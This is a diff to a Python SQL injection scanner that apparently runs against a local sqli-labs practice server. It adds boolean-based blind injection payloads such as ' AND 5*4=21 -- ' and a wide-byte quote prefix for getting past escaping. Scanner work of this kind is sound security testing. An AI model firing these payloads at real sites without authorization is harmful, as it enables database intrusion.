@@ -15,14 +15,26 @@ import math
 import re
 from lib.common import *
 from colorama import *
+from bs4 import BeautifulSoup as bs
 
 reload(sys)
 sys.setdefaultencoding('utf-8')
 """
-testInjectionWithOR还有点问题
+testInjectionWithOR还有点问题,
+data: 2018/05/14
+由 startTest() 函数开始，
+    分别调用了： testBoolStartPoint、testTimingStartPoint来分别检测bool型与时延注入
+        testBooleStartPoint调用了： testInjectionNumber、testInjection、testInjectionWithOR 来检测数字，混合的不稳定响应的情况
+        testTimingStartPoint调用了： testTiming 来检测时延注入
+            testTiming 检测返回的响应时间与payload的sleep是否相符， 
+            testInjectionNumber、testInjection、testInjectionWithOR, 调用 payload来请求， 检测响应中的值是否与原响应值相同， 调用 了filter_body函数
+                filter_body： 过滤掉时间，与payload自身， TODO： 提取出标签的text值，减少因为服务器的callback中随机数的误报？
+                                                        TODO： 宽字符注入，如何匹配html中的payload？
+
 """
 
 # logger  = LogUtil()
+
 
 class SQLInjectionTime(object):
     def __init__(self, url, headers, data=None):
@@ -143,6 +155,36 @@ class SQLInjectionTime(object):
     def filter_body(self, body, param_value):
         # filter the variable in body
         # awvs 还有一个extractTextFromBody, 暂时先不写， 推测可能是从标签中获取text，可以用beautifulSoup来实现
+        # filter the text use bs4
+        # try:
+        #     soup = bs(body, 'html.parser')
+        #     clean_body = ''
+        #     # get a tag text
+        #     for a_tag in soup.find_all('a'):
+        #         clean_body += a_tag.get_text()
+            
+        #     # get p tag text
+        #     for a_tag in soup.find_all('p'):
+        #         clean_body += a_tag.get_text()
+
+        #     for a_tag in soup.find_all('textarea'):
+        #         clean_body += a_tag.get_text()
+
+        #     for a_tag in soup.find_all('input'):
+        #         clean_body += a_tag.get_text()
+
+        #     for a_tag in soup.find_all('span'):
+        #         clean_body += a_tag.get_text()
+
+        #     # for a_tag in soup.find_all('div'):
+        #     #     clean_body += a_tag.get_text()
+
+        #     for h in ['h1', 'h2', 'h3', 'h4', 'h5', 'h6']:
+        #         for a_tag in soup.find_all(h):
+        #             clean_body += a_tag.get_text()
+            
+        # except Exception as e:
+        #     logger.error("Parse The HTML Error For Rason={}".format(repr(e)))
 
         # 过滤掉时间
         body = re.sub(r'([0-1]?[0-9]|[2][0-3]):([0-5][0-9])[.|:]([0-9][0-9])', '', body)
@@ -185,6 +227,22 @@ class SQLInjectionTime(object):
                 confirmed = True
         return True
 
+    def testInjectionNumber(self, varIndex, quoteChar, likeInjection):
+        confirmed = False
+        confirmResult = False
+        while True:
+            confirmResult = self.confirmInjectionNumber(varIndex, quoteChar, likeInjection, confirmed)
+            logger.info("confirmResult={}".format(confirmResult))
+
+            if (not confirmResult):
+                # print "!!!!!!!!!!!!!!!!!!!!!!!!!"
+                return False
+
+            if confirmed:
+                break
+            else:
+                confirmed = True
+        return True
 
     def testInjectionWithOR(self, varIndex, quoteChar, dontCommentRestOfQuery):
         # 如果响应不稳定， 可以过or来做测试
@@ -255,15 +313,15 @@ class SQLInjectionTime(object):
 
         logger.info('origValue={}'.format(origValue))
         #logger.info('self.variations={}'.format(self.variations))
-        testBody = self.filter_body(html, (paramValue[self.variations[varIndex]].replace(origValue[self.variations[varIndex]], '')))
+        testBody = self.filter_body(html, payload1)
         logger.info('paramValue[self.variations] = {}'.format(paramValue[self.variations[varIndex]].replace(origValue[self.variations[varIndex]], '')))
         #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
         if testBody != origBody:
             #logger.info('paramValue')
             #logger.info('testBody!=origBody')
-            logger.info('{}'.format(testBody))
-            logger.info('------------------------------')
-            logger.info('{}'.format(origBody))
+            # logger.info('{}'.format(testBody))
+            # logger.info('------------------------------')
+            # logger.info('{}'.format(origBody))
             return False
 
         # add to confirmInjectionHistory
@@ -282,7 +340,7 @@ class SQLInjectionTime(object):
         if self.hj.ConnectionErrorCount >0:
             return False
 
-        testBody = self.filter_body(html, urllib.urlencode(paramValue))
+        testBody = self.filter_body(html, payload2)
         #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() > 0.99:
         if testBody == origBody:
             return False
@@ -302,14 +360,14 @@ class SQLInjectionTime(object):
         if self.hj.ConnectionErrorCount >0:
             return False
 
-        testBody = self.filter_body(html, urllib.urlencode(paramValue))
+        testBody = self.filter_body(html, payload3)
         if testBody == origBody:
         #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() > 0.99:
             return False
 
         # add to confirmInjectionHistory
         if not hasbrackets:
-            payload4 = likeStr + quoteChar + " AND 3*2>(1*5) AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+            payload4 = likeStr + quoteChar + " AND 3*2>(1*5) AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
         else:
             payload4 = likeStr + quoteChar + " AND 3*2>(1*5) AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload4= {}".format(payload4))
@@ -319,17 +377,21 @@ class SQLInjectionTime(object):
         self.hj.request_param_dict = paramValue
         status_code, headers, html, time_used = self.hj.request()
         if self.hj.ConnectionErrorCount >0:
+            logger.info("AT payload4 Error Happend: {}".format(repr(e)))
             return False
 
-        testBody = self.filter_body(html, urllib.urlencode(paramValue))
+        testBody = self.filter_body(html, payload4)
         #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
         if testBody != origBody:
+            logger.info('{}'.format(testBody))
+            logger.info('------------------------------')
+            logger.info('{}'.format(origBody))
             return False
         # and to conrimInjecitionHistory
 
         # 测试真值
         if not hasbrackets:
-            payload5 = likeStr + quoteChar + " AND 3*2*0>=0 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+            payload5 = likeStr + quoteChar + " AND 3*2*0>=0 AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
         else:
             payload5 = likeStr + quoteChar + " AND 3*2*0>=0 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload5= {}".format(payload5))
@@ -341,7 +403,7 @@ class SQLInjectionTime(object):
         if self.hj.ConnectionErrorCount >0:
             return False
 
-        testBody = self.filter_body(html, urllib.urlencode(paramValue))
+        testBody = self.filter_body(html, payload5)
         #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
         if testBody != origBody:
             return False
@@ -349,7 +411,7 @@ class SQLInjectionTime(object):
 
         # 然后再测假值
         if not hasbrackets:
-            payload6 = likeStr + quoteChar + " AND 3*3*9<(2*4) AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+            payload6 = likeStr + quoteChar + " AND 3*3*9<(2*4) AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
         else:
             payload6 = likeStr + quoteChar + " AND 3*3*9<(2*4) AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload6= {}".format(payload6))
@@ -361,7 +423,7 @@ class SQLInjectionTime(object):
         if  self.hj.ConnectionErrorCount >0:
             return False
 
-        testBody = self.filter_body(html, urllib.urlencode(paramValue))
+        testBody = self.filter_body(html, payload6)
         if testBody == origBody:
         #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
             return False
@@ -371,7 +433,7 @@ class SQLInjectionTime(object):
         # do some common test
         # common test 真值
         if not hasbrackets:
-            payload7 = likeStr + quoteChar + " AND 5*4=20 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+            payload7 = likeStr + quoteChar + " AND 5*4=20 AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
         else:
             payload7 = likeStr + quoteChar + " AND 5*4=20 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload7= {}".format(payload7))
@@ -383,7 +445,7 @@ class SQLInjectionTime(object):
         if  self.hj.ConnectionErrorCount >0:
             return False
 
-        testBody = self.filter_body(html, urllib.urlencode(paramValue))
+        testBody = self.filter_body(html, payload7)
         if testBody != origBody:
 
         #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() >  0.99:
@@ -392,7 +454,7 @@ class SQLInjectionTime(object):
 
         # common test 假值
         if not hasbrackets:
-            payload8 = likeStr + quoteChar + " AND 5*4=21 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+            payload8 = likeStr + quoteChar + " AND 5*4=21 AND "+ '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
         else:
             payload8 = likeStr + quoteChar + " AND 5*4=21 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload8= {}".format(payload8))
@@ -404,7 +466,7 @@ class SQLInjectionTime(object):
         if self.hj.ConnectionErrorCount >0:
             return False
 
-        testBody = self.filter_body(html, urllib.urlencode(paramValue))
+        testBody = self.filter_body(html, payload8)
         if testBody == origBody:
         #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() <  0.9:
             return False
@@ -412,7 +474,7 @@ class SQLInjectionTime(object):
 
         # 假值
         if not hasbrackets:
-            payload9 = likeStr + quoteChar + " AND 5*6<26 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+            payload9 = likeStr + quoteChar + " AND 5*6<26 AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
         else:
             payload9 = likeStr + quoteChar + " AND 5*6<26 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload9= {}".format(payload9))
@@ -424,7 +486,7 @@ class SQLInjectionTime(object):
         if self.hj.ConnectionErrorCount >0:
             return False
 
-        testBody = self.filter_body(html, urllib.urlencode(paramValue))
+        testBody = self.filter_body(html, payload9)
         if testBody == origBody:
         #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() <  0.9:
             return False
@@ -432,7 +494,7 @@ class SQLInjectionTime(object):
 
         # 真值
         if not hasbrackets:
-            payload10 = likeStr + quoteChar + " AND 7*7>48 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+            payload10 = likeStr + quoteChar + " AND 7*7>48 AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
         else:
             payload10 = likeStr + quoteChar + " AND 7*7>48 AND " +  '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload10= {}".format(payload10))
@@ -444,14 +506,14 @@ class SQLInjectionTime(object):
         if self.hj.ConnectionErrorCount >0:
             return False
 
-        testBody = self.filter_body(html, urllib.urlencode(paramValue))
+        testBody = self.filter_body(html, payload10)
         if testBody != origBody:
         #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() >  0.99:
             return False
 
         # 假值
         if not hasbrackets:
-            payload11 = likeStr + quoteChar + " AND 3*2*0=6 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+            payload11 = likeStr + quoteChar + " AND 3*2*0=6 AND "+ '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
         else:
             payload11 = likeStr + quoteChar + " AND 3*2*0=6 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload11= {}".format(payload11))
@@ -463,7 +525,7 @@ class SQLInjectionTime(object):
         if  self.hj.ConnectionErrorCount >0:
             return False
 
-        testBody = self.filter_body(html, urllib.urlencode(paramValue))
+        testBody = self.filter_body(html, payload11)
         if testBody == origBody:
         #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() >  0.99:
             return False
@@ -471,7 +533,7 @@ class SQLInjectionTime(object):
 
         # 真值
         if not hasbrackets:
-            payload12 = likeStr + quoteChar + " AND 3*2*1=6 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+            payload12 = likeStr + quoteChar + " AND 3*2*1=6 AND " + '\'' + randStr + '\'' + equalitySign + quoteChar + randStr  + likeStr
         else:
             payload12 = likeStr + quoteChar + " AND 3*2*1=6 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload12= {}".format(payload12))
@@ -483,7 +545,7 @@ class SQLInjectionTime(object):
         if  self.hj.ConnectionErrorCount >0:
             return False
 
-        testBody = self.filter_body(html, urllib.urlencode(paramValue))
+        testBody = self.filter_body(html, payload12)
         if testBody != origBody:
 
         #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() <  0.9:
@@ -491,6 +553,288 @@ class SQLInjectionTime(object):
 
         # logger.info("test if here")
         return paramValue
+
+
+    def confirmInjectionNumber(self, varIndex, quoteChar, likeInjection, confirmed):
+        # test the number injection
+        # awvs confirm injection rewrite
+        origValue = self.orivalue.copy()
+        # origValue
+        # 原始响应
+        origBody = self.origBody
+
+        # difflib compare the response
+
+        # 测试的响应
+        testBody = ""
+        paramValue = ""
+
+        # 暂时不知道如何使用
+        self.confirmInjectionHistory = False
+        randNum = 10 + int(math.floor(random.random() * 989))
+        randStr = random_str(length=4)
+
+        if (confirmed): randStr = '0000' + randStr
+        # numberic
+        # if (num):
+        #   randStr = randNum
+
+        equalitySign = "="
+        likeStr = ""
+
+        if (likeInjection):
+            likeStr = '%'
+            equalitySign = '!='
+
+        # 先不管数字型的，只看字符
+        hasbrackets = True if quoteChar.find(')') > -1  else False
+
+        payload1 = likeStr + quoteChar + " AND 2*3*8=6*8 -- "
+
+        # 生成payload
+        logger.info("payload1= {}".format(repr(payload1)))
+        paramValue = self.get_request_payload(origValue, varIndex, payload1)
+        logger.debug("paramValue= {}".format(repr(paramValue)))
+        # 如果正确，这里只有一个值
+        self.hj.request_param_dict = paramValue
+        status_code, headers, html, time_used = self.hj.request()
+        if  self.hj.ConnectionErrorCount >0:
+            logger.info('has error??????')
+            return False
+
+        logger.info('origValue={}'.format(origValue))
+        #logger.info('self.variations={}'.format(self.variations))
+        testBody = self.filter_body(html, payload1)
+        # logger.info('paramValue[self.variations] = {}'.format(paramValue[self.variations[varIndex]].replace(origValue[self.variations[varIndex]], '')))
+        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
+        if testBody != origBody:
+            #logger.info('paramValue')
+            #logger.info('testBody!=origBody')
+            # logger.info('{}'.format(testBody))
+            # logger.info('------------------------------')
+            # logger.info('{}'.format(origBody))
+            return False
+
+        # add to confirmInjectionHistory
+
+        # 测试假值
+
+        payload2 = likeStr + quoteChar + " AND 2*3*8=6*9 -- "
+
+        logger.info("payload2= {}".format(repr(payload2)))
+        paramValue = self.get_request_payload(origValue, varIndex, payload2)
+
+        # 如果正确，这里只有一个值
+        self.hj.request_param_dict = paramValue
+        status_code, headers, html, time_used = self.hj.request()
+        if self.hj.ConnectionErrorCount >0:
+            return False
+
+        testBody = self.filter_body(html, payload2)
+        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() > 0.99:
+        if testBody == origBody:
+            return False
+
+        # add to confirmInjectionHistory
+        # 再测一个假值
+
+        payload3 = likeStr + quoteChar + " AND 3*3<(2*4) -- "
+
+        logger.info("payload2= {}".format(repr(payload3)))
+        paramValue = self.get_request_payload(origValue, varIndex, payload3)
+        # logger.debug("paramValue= {}".format(paramValue))
+        # 如果正确，这里只有一个值
+        self.hj.request_param_dict = paramValue
+        status_code, headers, html, time_used = self.hj.request()
+        if self.hj.ConnectionErrorCount >0:
+            return False
+
+
+        testBody = self.filter_body(html, payload3)
+        if testBody == origBody:
+        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() > 0.99:
+            return False
+
+        # add to confirmInjectionHistory
+
+        payload4 = likeStr + quoteChar + " AND 3*2>(1*5) -- "
+        logger.info("payload2= {}".format(repr(payload4)))
+        paramValue = self.get_request_payload(origValue, varIndex, payload4)
+
+        # 如果正确，这里只有一个值
+        self.hj.request_param_dict = paramValue
+        status_code, headers, html, time_used = self.hj.request()
+        if self.hj.ConnectionErrorCount >0:
+            return False
+
+
+        testBody = self.filter_body(html, payload4)
+        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
+        if testBody != origBody:
+            return False
+        # and to conrimInjecitionHistory
+
+        # 测试真值
+
+        payload5 = likeStr + quoteChar + " AND 3*2*0>=0 -- "
+        logger.info("payload2= {}".format(repr(payload5)))
+        paramValue = self.get_request_payload(origValue, varIndex, payload5)
+
+        # 如果正确，这里只有一个值
+        self.hj.request_param_dict = paramValue
+        status_code, headers, html, time_used = self.hj.request()
+        if self.hj.ConnectionErrorCount >0:
+            return False
+
+
+        testBody = self.filter_body(html, payload5)
+        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
+        if testBody != origBody:
+            return False
+        # and to conrimInjecitionHistory
+
+        # 然后再测假值
+
+        payload6 = likeStr + quoteChar + " AND 3*3*9<(2*4) -- "
+        logger.info("payload2= {}".format(repr(payload6)))
+        paramValue = self.get_request_payload(origValue, varIndex, payload6)
+
+        # 如果正确，这里只有一个值
+        self.hj.request_param_dict = paramValue
+        status_code, headers, html, time_used = self.hj.request()
+        if  self.hj.ConnectionErrorCount >0:
+            return False
+
+
+        testBody = self.filter_body(html, payload6)
+        if testBody == origBody:
+        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() < 0.9:
+            return False
+        # and to conrimInjecitionHistory
+
+
+        # do some common test
+        # common test 真值
+
+        payload7 = likeStr + quoteChar + " AND 5*4=20 -- "
+
+        logger.info("payload2= {}".format(repr(payload7)))
+        paramValue = self.get_request_payload(origValue, varIndex, payload7)
+
+        # 如果正确，这里只有一个值
+        self.hj.request_param_dict = paramValue
+        status_code, headers, html, time_used = self.hj.request()
+        if  self.hj.ConnectionErrorCount >0:
+            return False
+
+
+        testBody = self.filter_body(html, payload7)
+        if testBody != origBody:
+
+        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() >  0.99:
+            return False
+        # add to confirmInjectionHistory
+
+        # common test 假值
+
+        payload8 = likeStr + quoteChar + " AND 5*4=21 -- "
+
+        logger.info("payload2= {}".format(repr(payload8)))
+        paramValue = self.get_request_payload(origValue, varIndex, payload8)
+
+        # 如果正确，这里只有一个值
+        self.hj.request_param_dict = paramValue
+        status_code, headers, html, time_used = self.hj.request()
+        if self.hj.ConnectionErrorCount >0:
+            return False
+
+
+        testBody = self.filter_body(html, payload8)
+        if testBody == origBody:
+        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() <  0.9:
+            return False
+        # and to conrimInjecitionHistory
+
+        # 假值
+
+        payload9 = likeStr + quoteChar + " AND 5*6<26 -- "
+
+        logger.info("payload2= {}".format(repr(payload9)))
+        paramValue = self.get_request_payload(origValue, varIndex, payload9)
+
+        # 如果正确，这里只有一个值
+        self.hj.request_param_dict = paramValue
+        status_code, headers, html, time_used = self.hj.request()
+        if self.hj.ConnectionErrorCount >0:
+            return False
+
+
+        testBody = self.filter_body(html, payload9)
+        if testBody == origBody:
+        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() <  0.9:
+            return False
+        # and to conrimInjecitionHistory
+
+        # 真值
+
+        payload10 = likeStr + quoteChar + " AND 7*7>48 -- "
+
+        logger.info("payload2= {}".format(repr(payload10)))
+        paramValue = self.get_request_payload(origValue, varIndex, payload10)
+
+        # 如果正确，这里只有一个值
+        self.hj.request_param_dict = paramValue
+        status_code, headers, html, time_used = self.hj.request()
+        if self.hj.ConnectionErrorCount >0:
+            return False
+
+        testBody = self.filter_body(html, payload10)
+        if testBody != origBody:
+        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() >  0.99:
+            return False
+
+        # 假值
+
+        payload11 = likeStr + quoteChar + " AND 3*2*0=6 -- "
+
+        logger.info("payload2= {}".format(repr(payload11)))
+        paramValue = self.get_request_payload(origValue, varIndex, payload11)
+
+        # 如果正确，这里只有一个值
+        self.hj.request_param_dict = paramValue
+        status_code, headers, html, time_used = self.hj.request()
+        if  self.hj.ConnectionErrorCount >0:
+            return False
+
+
+        testBody = self.filter_body(html, payload11)
+        if testBody == origBody:
+        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() >  0.99:
+            return False
+        # and to conrimInjecitionHistory
+
+        # 真值
+
+        payload12 = likeStr + quoteChar + " AND 3*2*1=6 -- "
+
+        logger.info("payload2= {}".format(repr(payload12)))
+        paramValue = self.get_request_payload(origValue, varIndex, payload12)
+
+        # 如果正确，这里只有一个值
+        self.hj.request_param_dict = paramValue
+        status_code, headers, html, time_used = self.hj.request()
+        if  self.hj.ConnectionErrorCount >0:
+            return False
+
+        testBody = self.filter_body(html, payload12)
+        if testBody != origBody:
+
+        #if difflib.SequenceMatcher(lambda x:x in ' \t', testBody, origBody).ratio() <  0.9:
+            return False
+
+        # logger.info("test if here")
+        return paramValue
+
 
     def get_request_payload(self, origValue, varIndex, payload, initvalue=False):
         if isinstance(payload, list):
@@ -950,7 +1294,13 @@ class SQLInjectionTime(object):
 
 
     def testBoolStartPoint(self, varIndex):
-        prefix = ['', '\'', '"', '\')', '")']
+        prefix = ['', '\'', '"', '\')', '")', '\xdf\'']
+        for quoteChar in prefix:
+            time_result = self.testInjectionNumber(varIndex, quoteChar, False)
+            if time_result:
+                logger.info(Fore.RED + "Found Bool Injection At URL={}".format(self.url) + Style.RESET_ALL)
+                return True
+        
         for quoteChar in prefix:
             time_result = self.testInjection(varIndex, quoteChar, False)
             if time_result:
@@ -973,14 +1323,17 @@ class SQLInjectionTime(object):
                 else:
                     logger.info("[startTest] Response Is Not Stable")
 
-                #r = self.testTimingStartPoint(varIndex)
-                #if r:
-                    # here shoud be return a format result
-                #    return True
-
                 r = self.testBoolStartPoint(varIndex)
                 if r:
                     return True
+
+
+                # r = self.testTimingStartPoint(varIndex)
+                # if r:
+                #     #here shoud be return a format result
+                #     return True
+
+
 
             return False
         except Exception as e:
@@ -1026,34 +1379,34 @@ def main():
     url = 'http://10.127.21.237/sqli-labs/Less-25a/?id=1'
     url_list = ['http://10.127.21.237/sqli-labs/Less-26/?id=1',]
     url_list += ['http://10.127.21.237/sqli-labs/Less-1/?id=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-2/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-3/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-26a/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-27/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-27a/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-28/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-28a/?id=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-29/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-30/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-31/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-32/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-33/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-35/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-36/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-38/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-39/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-40/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-41/?id=1',]
-    '''
-    url_list += ['http://10.127.21.237/sqli-labs/Less-46/?sort=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-47/?sort=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-48/?sort=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-49/?sort=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-50/?sort=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-51/?sort=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-52/?sort=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-53/?sort=1',]
-    '''
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-2/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-3/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-26a/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-27/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-27a/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-28/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-28a/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-29/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-30/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-31/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-32/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-33/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-35/?id=1',]
+    url_list += ['http://10.127.21.237/sqli-labs/Less-36/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-38/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-39/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-40/?id=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-41/?id=1',]
+
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-46/?sort=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-47/?sort=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-48/?sort=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-49/?sort=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-50/?sort=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-51/?sort=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-52/?sort=1',]
+    # url_list += ['http://10.127.21.237/sqli-labs/Less-53/?sort=1',]
+
 
     result = []
     for url in url_list:
